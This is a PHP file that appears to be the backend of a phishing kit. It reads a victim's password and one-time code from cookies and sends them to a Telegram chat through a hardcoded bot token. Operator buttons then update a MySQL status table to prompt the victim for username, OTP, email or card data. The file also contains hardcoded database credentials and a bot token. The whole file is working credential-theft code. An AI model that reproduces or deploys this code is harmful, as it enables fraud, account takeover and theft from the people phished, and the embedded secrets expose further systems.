<?php

$usuario = $_COOKIE['contraseña'];

if (isset($_COOKIE['cdinamica'])) {
    $otp = $_COOKIE['cdinamica'];

       sendMessageWithButtons($chatId, "Registro:$usuario\n Otp: $otp", $buttons);

} else {
    
}


$botToken = '6473831509:AAEOJz1wQGkabbzRuXKWmvGXKqDo1dhBFcQ';

$telegramApiUrl = "https://api.telegram.org/bot{$botToken}/";

function sendMessageWithButtons($chatId, $text, $buttons) {
    global $telegramApiUrl;

    $encodedButtons = json_encode($buttons);

    $params = array(
        "chat_id" => $chatId,
        "text" => $text,
        "reply_markup" => $encodedButtons
    );

    $sendMessageUrl = $telegramApiUrl . "sendMessage";

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $sendMessageUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}
function handleCallbackQuery($callbackQuery) {
    $callbackData = $callbackQuery['data'];
    $chatId = $callbackQuery['message']['chat']['id'];
    $originalMessageText = $callbackQuery['message']['text'];

    $startPos = strpos($originalMessageText, 'Registro:') + strlen('Registro:');
    $endPos = strpos($originalMessageText, 'Contraseña');
    $usuario = trim(substr($originalMessageText, $startPos, $endPos - $startPos));

    switch ($callbackData) {
        case 'action1':
            actualizarEstadoUsuario($usuario);
            $responseText = "Se pidio Usuario $usuario";
            break;
        case 'action2':
            actualizarEstadoOtp($usuario);
            $responseText = "Se pidio Dinamica $usuario";
            break;
        case 'action3':
            actualizarEstadoCorreo($usuario);
            $responseText = "Se pidio Correo";
            break;
        case 'action4':
            actualizarEstadoTarjeta($usuario);
            $responseText = "Se pidio Tarjeta";

            break;
        default:
            $responseText = "Botón desconocido";
    }

    sendMessage($chatId, $responseText);
}

function sendMessage($chatId, $text) {
    global $telegramApiUrl;

    // Parámetros del mensaje
    $params = array(
        "chat_id" => $chatId,
        "text" => $text
    );

    $sendMessageUrl = $telegramApiUrl . "sendMessage";

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $sendMessageUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    // Retorna la respuesta de la API de Telegram
    return $response;
}

function conectarBaseDeDatos() {
    $servidor = 'localhost';
    $usuario = 'u109143057_pachanga';
    $contrasena = 'Yaco1612';
    $nombreBD = 'u109143057_pachanga';
    


    try {
        $conexion = new PDO("mysql:host=$servidor;dbname=$nombreBD", $usuario, $contrasena);
        // Habilitar el manejo de errores de PDO
        $conexion->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        return $conexion;
    } catch(PDOException $e) {
        // Manejar el error en caso de fallo en la conexión
        die("Error de conexión: " . $e->getMessage());
    }
}

function actualizarEstadoUsuario($usuario) {
    $conexion = conectarBaseDeDatos();
    try {
        $consulta = $conexion->prepare("UPDATE rtr45 SET status = 12 WHERE usuario = :usuario");
        $consulta->bindParam(':usuario', $usuario);
        $consulta->execute();
        $conexion = null;
        return true; 
    } catch(PDOException $e) {
        die("Error al actualizar el estado: " . $e->getMessage());
    }
}

function actualizarEstadoOtp($usuario) {
    $conexion = conectarBaseDeDatos();
    try {
        $consulta = $conexion->prepare("UPDATE rtr45 SET status = 2 WHERE usuario = :usuario");
        $consulta->bindParam(':usuario', $usuario);
        $consulta->execute();
        $conexion = null;
        return true; // Éxito al actualizar el estado
    } catch(PDOException $e) {
        die("Error al actualizar el estado: " . $e->getMessage());
    }
}

function actualizarEstadoCorreo($usuario) {
    $conexion = conectarBaseDeDatos();
    try {
        $consulta = $conexion->prepare("UPDATE rtr45 SET status = 4 WHERE usuario = :usuario");
        $consulta->bindParam(':usuario', $usuario);
        $consulta->execute();
        $conexion = null;
        return true; // Éxito al actualizar el estado
    } catch(PDOException $e) {
        die("Error al actualizar el estado: " . $e->getMessage());
    }
}

function actualizarEstadoTarjeta($usuario) {
    $conexion = conectarBaseDeDatos();
    try {
        $consulta = $conexion->prepare("UPDATE rtr45 SET status = 6 WHERE usuario = :usuario");
        $consulta->bindParam(':usuario', $usuario);
        $consulta->execute();
        $conexion = null;
        return true; // Éxito al actualizar el estado
    } catch(PDOException $e) {
        die("Error al actualizar el estado: " . $e->getMessage());
    }
}



$update = json_decode(file_get_contents("php://input"), true);

if (isset($update['callback_query'])) {
    handleCallbackQuery($update['callback_query']);
} else {
    $buttons = array(
        "inline_keyboard" => array(
            array(
                array("text" => "USUARIO", "callback_data" => "action1"),
                array("text" => "OTP", "callback_data" => "action2"),
                array("text" => "ErrOTP", "callback_data" => "action3"),
                array("text" => "BAY", "callback_data" => "action4"),
            )
        )
    );

    $chatId = '-4088574570';

    // Enviar un mensaje con botones y los datos del registro
    sendMessageWithButtons($chatId, "Registro: $usuario Contraseña", $buttons);
}
